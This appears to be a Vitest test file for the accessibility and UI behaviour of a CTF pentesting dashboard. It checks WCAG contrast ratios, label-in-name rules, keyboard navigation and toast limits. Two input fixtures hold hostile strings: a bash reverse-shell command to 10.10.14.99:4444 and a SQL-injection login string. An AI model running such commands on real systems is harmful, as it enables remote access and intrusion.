import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import { render, screen, fireEvent, act, cleanup, waitFor } from '@testing-library/react';
import { MemoryRouter } from 'react-router-dom';
import { CyberButton } from '../../components/common/CyberButton';
import { CyberSelect, CyberMultiSelect } from '../../components/common/CyberSelect';
import { CyberInput } from '../../components/common/CyberInput';
import { ToastContainer } from '../../components/common/ToastContainer';
import { useToastStore, toast } from '../../store/useToastStore';
import { UnifiedHeader } from '../../components/layout/UnifiedHeader';
import { useCtfStore, applyThemePreset, ThemePreset } from '../../store/useCtfStore';
import { applyThemeToDOM } from '../../hooks/useTheme';

// Relative Luminance and WCAG 2.1 Contrast Calculation Utilities
function getChannelLuminance(val: number): number {
  const norm = val / 255;
  return norm <= 0.03928 ? norm / 12.92 : Math.pow((norm + 0.055) / 1.055, 2.4);
}

function getRelativeLuminance(r: number, g: number, b: number): number {
  return 0.2126 * getChannelLuminance(r) + 0.7152 * getChannelLuminance(g) + 0.0722 * getChannelLuminance(b);
}

function calculateContrastRatio(rgb1: [number, number, number], rgb2: [number, number, number]): number {
  const lum1 = getRelativeLuminance(...rgb1);
  const lum2 = getRelativeLuminance(...rgb2);
  const max = Math.max(lum1, lum2);
  const min = Math.min(lum1, lum2);
  return (max + 0.05) / (min + 0.05);
}

// Canonical Tokens as defined in src/index.css
const THEME_PRESET_TOKENS = {
  obsidian: {
    light: {
      surfaceBase: [244, 244, 245] as [number, number, number],      // #f4f4f5
      surfaceCard: [255, 255, 255] as [number, number, number],      // #ffffff
      surfaceElevated: [255, 255, 255] as [number, number, number],  // #ffffff
      surfaceSunken: [228, 228, 231] as [number, number, number],    // #e4e4e7
      textPrimary: [9, 9, 11] as [number, number, number],           // #09090b
      textSecondary: [51, 65, 85] as [number, number, number],       // #334155
      textMuted: [82, 82, 91] as [number, number, number],           // #52525b
      textTertiary: [113, 113, 122] as [number, number, number],     // #71717a
      borderAccent: [2, 132, 199] as [number, number, number],       // #0284c7 (Deep Sky Accent)
    },
    dark: {
      surfaceBase: [9, 9, 11] as [number, number, number],           // #09090b
      surfaceCard: [18, 18, 21] as [number, number, number],         // #121215
      surfaceElevated: [24, 24, 27] as [number, number, number],     // #18181b
      surfaceSunken: [12, 12, 15] as [number, number, number],       // #0c0c0f
      textPrimary: [244, 244, 245] as [number, number, number],       // #f4f4f5
      textSecondary: [228, 228, 231] as [number, number, number],   // #e4e4e7
      textMuted: [161, 161, 170] as [number, number, number],       // #a1a1aa
      textTertiary: [113, 113, 122] as [number, number, number],     // #71717a
      borderAccent: [14, 165, 233] as [number, number, number],      // #0ea5e9 (Sky)
    },
  },
  monolith: {
    light: {
      surfaceBase: [250, 250, 250] as [number, number, number],      // #fafafa
      surfaceCard: [255, 255, 255] as [number, number, number],      // #ffffff
      surfaceElevated: [255, 255, 255] as [number, number, number],  // #ffffff
      surfaceSunken: [244, 244, 245] as [number, number, number],    // #f4f4f5
      textPrimary: [9, 9, 11] as [number, number, number],           // #09090b
      textSecondary: [51, 65, 85] as [number, number, number],       // #334155
      textMuted: [82, 82, 91] as [number, number, number],           // #52525b
      textTertiary: [113, 113, 122] as [number, number, number],     // #71717a
      borderAccent: [2, 132, 199] as [number, number, number],       // #0284c7
    },
    dark: {
      surfaceBase: [24, 24, 27] as [number, number, number],         // #18181b
      surfaceCard: [39, 39, 42] as [number, number, number],         // #27272a
      surfaceElevated: [50, 50, 56] as [number, number, number],     // #323238
      surfaceSunken: [9, 9, 11] as [number, number, number],         // #09090b
      textPrimary: [244, 244, 245] as [number, number, number],       // #f4f4f5
      textSecondary: [228, 228, 231] as [number, number, number],   // #e4e4e7
      textMuted: [161, 161, 170] as [number, number, number],       // #a1a1aa
      textTertiary: [113, 113, 122] as [number, number, number],     // #71717a
      borderAccent: [56, 189, 248] as [number, number, number],      // #38bdf8
    },
  },
  htb: {
    light: {
      surfaceBase: [241, 245, 249] as [number, number, number],      // #f1f5f9
      surfaceCard: [255, 255, 255] as [number, number, number],      // #ffffff
      surfaceElevated: [255, 255, 255] as [number, number, number],  // #ffffff
      surfaceSunken: [226, 232, 240] as [number, number, number],    // #e2e8f0
      textPrimary: [15, 23, 42] as [number, number, number],         // #0f172a
      textSecondary: [51, 65, 85] as [number, number, number],       // #334155
      textMuted: [71, 85, 105] as [number, number, number],          // #475569
      textTertiary: [100, 116, 139] as [number, number, number],     // #64748b
      borderAccent: [21, 128, 61] as [number, number, number],       // #15803d (Forest Lime)
    },
    dark: {
      surfaceBase: [0, 0, 0] as [number, number, number],            // #000000 (OLED Black)
      surfaceCard: [11, 16, 21] as [number, number, number],         // #0b1015
      surfaceElevated: [18, 24, 32] as [number, number, number],     // #121820
      surfaceSunken: [5, 7, 10] as [number, number, number],         // #05070a
      textPrimary: [255, 255, 255] as [number, number, number],       // #ffffff
      textSecondary: [228, 228, 231] as [number, number, number],   // #e4e4e7
      textMuted: [148, 163, 184] as [number, number, number],       // #94a3b8
      textTertiary: [100, 116, 139] as [number, number, number],     // #64748b
      borderAccent: [159, 239, 0] as [number, number, number],       // #9fef00 (Neon Lime)
    },
  },
};

describe('Milestone 1 Challenger 2: Accessibility & Interactive Invariants Adversarial Harness', () => {
  beforeEach(() => {
    localStorage.clear();
    useToastStore.setState({ toasts: [] });
    useCtfStore.setState({
      globalVars: {
        lhost: '10.10.14.99',
        lport: '9001',
        targetIp: '10.10.10.200',
        interface: 'tun0',
        customVars: {},
      },
      activeTargetId: null,
      soundEnabled: false,
    });
  });

  afterEach(() => {
    cleanup();
    localStorage.clear();
    document.documentElement.className = '';
    document.documentElement.removeAttribute('data-mode');
    document.documentElement.removeAttribute('data-theme');
    document.documentElement.style.colorScheme = '';
  });

  // =========================================================================
  // SECTION 1: WCAG 2.1 AA Contrast Ratios Across All 3 Presets in Both Modes
  // =========================================================================
  describe('1. WCAG 2.1 AA Contrast Ratios Across Presets (Obsidian, Monolith, HTB)', () => {
    const presets: ThemePreset[] = ['obsidian', 'monolith', 'htb'];
    const modes: ('light' | 'dark')[] = ['light', 'dark'];

    presets.forEach((preset) => {
      modes.forEach((mode) => {
        const tokens = THEME_PRESET_TOKENS[preset][mode];

        it(`[${preset.toUpperCase()} - ${mode.toUpperCase()}]: verifies text-primary meets WCAG AAA (>= 7:1) on card and base`, () => {
          const ratioOnCard = calculateContrastRatio(tokens.textPrimary, tokens.surfaceCard);
          const ratioOnBase = calculateContrastRatio(tokens.textPrimary, tokens.surfaceBase);

          expect(ratioOnCard).toBeGreaterThanOrEqual(7.0);
          expect(ratioOnBase).toBeGreaterThanOrEqual(7.0);
        });

        it(`[${preset.toUpperCase()} - ${mode.toUpperCase()}]: verifies text-secondary meets WCAG AA (>= 4.5:1) on card and base`, () => {
          const ratioOnCard = calculateContrastRatio(tokens.textSecondary, tokens.surfaceCard);
          const ratioOnBase = calculateContrastRatio(tokens.textSecondary, tokens.surfaceBase);

          expect(ratioOnCard).toBeGreaterThanOrEqual(4.5);
          expect(ratioOnBase).toBeGreaterThanOrEqual(4.5);
        });

        it(`[${preset.toUpperCase()} - ${mode.toUpperCase()}]: verifies text-muted meets WCAG AA (>= 4.5:1) on card and base`, () => {
          const ratioOnCard = calculateContrastRatio(tokens.textMuted, tokens.surfaceCard);
          const ratioOnBase = calculateContrastRatio(tokens.textMuted, tokens.surfaceBase);

          expect(ratioOnCard).toBeGreaterThanOrEqual(4.5);
          expect(ratioOnBase).toBeGreaterThanOrEqual(4.5);
        });

        it(`[${preset.toUpperCase()} - ${mode.toUpperCase()}]: verifies text-tertiary meets large/incidental UI (>= 3:1) on card`, () => {
          const ratioOnCard = calculateContrastRatio(tokens.textTertiary, tokens.surfaceCard);
          expect(ratioOnCard).toBeGreaterThanOrEqual(3.0);
        });

        it(`[${preset.toUpperCase()} - ${mode.toUpperCase()}]: verifies border-accent meets non-text UI component contrast (>= 3:1) against base`, () => {
          const ratioOnBase = calculateContrastRatio(tokens.borderAccent, tokens.surfaceBase);
          expect(ratioOnBase).toBeGreaterThanOrEqual(3.0);
        });
      });
    });

    it('verifies CyberButton primary variant uses black text on HTB dark neon lime (ratio > 14:1)', () => {
      const limeAccent = THEME_PRESET_TOKENS.htb.dark.borderAccent; // [159, 239, 0]
      const slate950: [number, number, number] = [2, 6, 23]; // Tailwind slate-950
      const whiteText: [number, number, number] = [255, 255, 255];

      const slateContrast = calculateContrastRatio(slate950, limeAccent);
      const whiteContrast = calculateContrastRatio(whiteText, limeAccent);

      // Slate-950 / Black text on HTB Lime achieves high contrast
      expect(slateContrast).toBeGreaterThanOrEqual(14.0);
      // White text on HTB Lime is unacceptable for accessibility
      expect(whiteContrast).toBeLessThan(3.0);
    });

    it('verifies CyberButton danger variant has >= 4.5:1 text contrast against dark elevated card', () => {
      const rose400: [number, number, number] = [251, 113, 133]; // Tailwind rose-400
      const darkSurfaceElevated = THEME_PRESET_TOKENS.obsidian.dark.surfaceElevated; // [24, 24, 27]

      const contrast = calculateContrastRatio(rose400, darkSurfaceElevated);
      expect(contrast).toBeGreaterThanOrEqual(4.5);
    });
  });

  // =========================================================================
  // SECTION 2: WCAG 2.1 SC 2.5.3 (Label in Name) Invariants
  // =========================================================================
  describe('2. WCAG 2.1 SC 2.5.3 (Label in Name) Invariants', () => {
    it('CyberButton: accessible name strictly contains visible text label', () => {
      render(<CyberButton>Deploy Exploit</CyberButton>);
      const button = screen.getByRole('button', { name: /Deploy Exploit/i });
      expect(button).toBeInTheDocument();
      expect(button.textContent).toContain('Deploy Exploit');
    });

    it('CyberButton: custom aria-label extends visible label without dropping it', () => {
      render(
        <CyberButton aria-label="Deploy Exploit - Run automated buffer overflow">
          Deploy Exploit
        </CyberButton>
      );
      const button = screen.getByRole('button', { name: /Deploy Exploit/i });
      expect(button).toBeInTheDocument();
      const ariaLabel = button.getAttribute('aria-label') || '';
      expect(ariaLabel.startsWith('Deploy Exploit')).toBe(true);
    });

    it('CyberSelect: trigger button accessible name contains visible selected option label', () => {
      const options = [
        { value: 'linux', label: 'Linux (Debian/Ubuntu)' },
        { value: 'windows', label: 'Windows (Active Directory)' },
      ];

      render(
        <CyberSelect
          id="target-os"
          label="Target Operating System"
          ariaLabel="Target OS Selector"
          value="linux"
          options={options}
          onChange={() => {}}
        />
      );

      const triggerBtn = screen.getByRole('button', { name: /Linux \(Debian\/Ubuntu\)/i });
      expect(triggerBtn).toBeInTheDocument();
      const computedAria = triggerBtn.getAttribute('aria-label') || '';
      // Under SC 2.5.3, the accessible name must contain the visible label
      expect(computedAria).toContain('Linux (Debian/Ubuntu)');
    });

    it('CyberSelect: trigger button accessible name contains visible placeholder when unselected', () => {
      const options = [
        { value: 'htb', label: 'Hack The Box' },
        { value: 'thm', label: 'TryHackMe' },
      ];

      render(
        <CyberSelect
          id="platform-select"
          placeholder="Choose CTF Platform..."
          ariaLabel="Platform Filter"
          value=""
          options={options}
          onChange={() => {}}
        />
      );

      const triggerBtn = screen.getByRole('button', { name: /Choose CTF Platform/i });
      expect(triggerBtn).toBeInTheDocument();
      const computedAria = triggerBtn.getAttribute('aria-label') || '';
      expect(computedAria).toContain('Choose CTF Platform...');
    });

    it('CyberMultiSelect: trigger button accessible name contains visible count when multiple selected', () => {
      const options = [
        { value: 'sqli', label: 'SQL Injection' },
        { value: 'xss', label: 'Cross-Site Scripting' },
        { value: 'rce', label: 'Remote Code Execution' },
      ];

      render(
        <CyberMultiSelect
          id="vuln-tags"
          placeholder="Filter Vulnerabilities"
          selectedValues={['sqli', 'rce']}
          options={options}
          onChange={() => {}}
        />
      );

      // Visible text shows: "Filter Vulnerabilities (2)"
      const triggerBtn = screen.getByRole('button', { name: /Filter Vulnerabilities \(2\)/i });
      expect(triggerBtn).toBeInTheDocument();
      const computedAria = triggerBtn.getAttribute('aria-label') || '';
      expect(computedAria).toContain('Filter Vulnerabilities (2)');
    });

    it('UnifiedHeader: variable inputs and action buttons comply with Label-in-Name', () => {
      render(
        <MemoryRouter>
          <UnifiedHeader />
        </MemoryRouter>
      );

      // 1. Attacker IP (LHOST)
      const lhostInput = screen.getByLabelText('Attacker IP (LHOST)');
      expect(lhostInput).toBeInTheDocument();
      expect(screen.getByText('L')).toBeInTheDocument();

      // 2. Target IP (RHOST)
      const rhostInput = screen.getByLabelText('Target IP (RHOST)');
      expect(rhostInput).toBeInTheDocument();
      expect(screen.getByText('R')).toBeInTheDocument();

      // 3. Listener Port (LPORT)
      const lportInput = screen.getByLabelText('Listener Port (LPORT)');
      expect(lportInput).toBeInTheDocument();
      expect(screen.getByText('P')).toBeInTheDocument();

      // 4. Copy buttons have clear accessible names
      expect(screen.getByRole('button', { name: 'Copy LHOST' })).toBeInTheDocument();
      expect(screen.getByRole('button', { name: 'Copy Target IP' })).toBeInTheDocument();
      expect(screen.getByRole('button', { name: 'Copy LPORT' })).toBeInTheDocument();

      // 5. RevShell button accessible name includes visible text "RevShell"
      const revShellBtn = screen.getByRole('button', { name: /RevShell/i });
      expect(revShellBtn).toBeInTheDocument();
      expect(revShellBtn.getAttribute('aria-label')).toContain('RevShell');

      // 6. Snippets button accessible name includes visible text "Snippets"
      const snippetsBtn = screen.getByRole('button', { name: /Snippets/i });
      expect(snippetsBtn).toBeInTheDocument();
      expect(snippetsBtn.getAttribute('aria-label')).toContain('Snippets');

      // 7. Deploy Box button accessible name includes visible text "Deploy Box"
      const deployBoxBtn = screen.getByRole('button', { name: /Deploy Box/i });
      expect(deployBoxBtn).toBeInTheDocument();
      expect(deployBoxBtn.getAttribute('aria-label')).toContain('Deploy Box');
    });
  });

  // =========================================================================
  // SECTION 3: Visible Focus Rings & Keyboard Navigation
  // =========================================================================
  describe('3. Visible Focus Rings & Keyboard Accessibility', () => {
    it('CyberButton: includes visible focus-visible classes and tactile compression', () => {
      render(<CyberButton>Tactical Trigger</CyberButton>);
      const button = screen.getByRole('button', { name: /Tactical Trigger/i });

      expect(button.className).toContain('focus-visible:ring-2');
      expect(button.className).toContain('focus-visible:ring-accent');
      expect(button.className).toContain('active:scale-[0.97]');
    });

    it('CyberSelect: supports complete keyboard navigation loop (Open, Arrow Navigate, Select, Close)', async () => {
      const handleChange = vi.fn();
      const options = [
        { value: 'nmap', label: 'Nmap Port Scan' },
        { value: 'rustscan', label: 'RustScan Fast' },
        { value: 'masscan', label: 'Masscan Turbo' },
      ];

      render(
        <CyberSelect
          id="scanner-select"
          value="nmap"
          options={options}
          onChange={handleChange}
        />
      );

      const triggerBtn = screen.getByRole('button', { name: /Nmap Port Scan/i });
      triggerBtn.focus();
      expect(document.activeElement).toBe(triggerBtn);

      // Open with Down Arrow
      fireEvent.keyDown(triggerBtn, { key: 'ArrowDown' });
      expect(screen.getByRole('listbox')).toBeInTheDocument();

      // Navigate down to rustscan
      fireEvent.keyDown(triggerBtn, { key: 'ArrowDown' });

      // Select with Enter
      fireEvent.keyDown(triggerBtn, { key: 'Enter' });
      expect(handleChange).toHaveBeenCalledWith('rustscan');

      // Re-open with Down Arrow, then close with Escape
      fireEvent.keyDown(triggerBtn, { key: 'ArrowDown' });
      expect(screen.getByRole('listbox')).toBeInTheDocument();
      fireEvent.keyDown(triggerBtn, { key: 'Escape' });
      await waitFor(() => {
        expect(screen.queryByRole('listbox')).not.toBeInTheDocument();
      });
    });

    it('CyberInput: includes focus ring and links error description via aria-describedby', () => {
      render(
        <CyberInput
          id="exploit-payload"
          label="Payload Command"
          error="Payload cannot contain null bytes"
          value="sh -i >& /dev/tcp/10.10.14.99/4444 0>&1"
          onChange={() => {}}
        />
      );

      const input = screen.getByLabelText('Payload Command');
      expect(input).toHaveAttribute('aria-invalid', 'true');
      expect(input).toHaveAttribute('aria-describedby', 'exploit-payload-error');
      expect(input.className).toContain('focus:ring-accent');

      const errorText = screen.getByRole('alert');
      expect(errorText).toHaveTextContent('Payload cannot contain null bytes');
      expect(errorText).toHaveAttribute('id', 'exploit-payload-error');
    });

    it('CyberInput: clearable button is accessible and triggers onClear callback', () => {
      const handleClear = vi.fn();
      render(
        <CyberInput
          id="search-input"
          value="admin' OR 1=1--"
          clearable
          onClear={handleClear}
          onChange={() => {}}
        />
      );

      const clearBtn = screen.getByRole('button', { name: 'Clear input' });
      expect(clearBtn).toBeInTheDocument();
      fireEvent.click(clearBtn);
      expect(handleClear).toHaveBeenCalledTimes(1);
    });
  });

  // =========================================================================
  // SECTION 4: Stress-Testing Rapid Theme Toggles & Toast Notification Bursts
  // =========================================================================
  describe('4. Rapid Theme Toggling & Toast Notification Stress Hardening', () => {
    it('survives 100 rapid sequential theme toggles and preset switches without DOM corruption or thrown errors', () => {
      const presets: ThemePreset[] = ['obsidian', 'monolith', 'htb'];

      expect(() => {
        for (let i = 0; i < 100; i++) {
          const mode: 'light' | 'dark' = i % 2 === 0 ? 'dark' : 'light';
          const preset = presets[i % presets.length];

          applyThemeToDOM(mode, false);
          applyThemePreset(preset);

          // Invariant checks on each step
          const hasDark = document.documentElement.classList.contains('dark');
          const hasLight = document.documentElement.classList.contains('light');

          // Never have both classes simultaneously
          expect(hasDark && hasLight).toBe(false);
          expect(document.documentElement.getAttribute('data-theme')).toBe(preset);
        }
      }).not.toThrow();

      // Final state invariant check (99 % 3 === 0 -> 'obsidian')
      expect(document.documentElement.getAttribute('data-theme')).toBe('obsidian');
    });

    it('ToastContainer: enforces bounded queue (maximum 5 toasts) during high-frequency burst (100 toasts)', () => {
      render(<ToastContainer />);

      // Rapidly fire 100 toasts
      act(() => {
        for (let i = 0; i < 100; i++) {
          toast.success(`Exploit ${i} executed`, `Host 10.10.10.${i}`);
        }
      });

      // Verify that DOM only contains at most 5 toasts (preventing memory leaks & detached nodes)
      const renderedToasts = screen.getAllByRole('status');
      expect(renderedToasts.length).toBeLessThanOrEqual(5);

      // Verify container has accessible live region wrapper
      const notificationRegion = screen.getByRole('region', { name: 'Notifications' });
      expect(notificationRegion).toBeInTheDocument();

      // Verify each toast is marked with aria-live="polite"
      renderedToasts.forEach((toastEl) => {
        expect(toastEl).toHaveAttribute('aria-live', 'polite');
      });
    });

    it('ToastContainer: manual dismissal button has accessible label and dismounts cleanly', () => {
      render(<ToastContainer />);

      act(() => {
        toast.error('Connection refused', 'Reverse Shell Error');
      });

      expect(screen.getByRole('status')).toBeInTheDocument();
      const dismissBtn = screen.getByRole('button', { name: 'Dismiss notification' });
      expect(dismissBtn).toBeInTheDocument();

      act(() => {
        fireEvent.click(dismissBtn);
      });

      // Verify toast is removed from store
      expect(useToastStore.getState().toasts.length).toBe(0);
    });

    it('ToastContainer: auto-dismissal timer cleans up store state and leaves zero detached nodes', () => {
      vi.useFakeTimers();
      render(<ToastContainer />);

      act(() => {
        toast.info('Recon scan complete', 'Scan Hub');
      });

      expect(useToastStore.getState().toasts.length).toBe(1);

      // Fast-forward past default duration (3500ms)
      act(() => {
        vi.advanceTimersByTime(4000);
      });

      expect(useToastStore.getState().toasts.length).toBe(0);
      vi.useRealTimers();
    });
  });
});
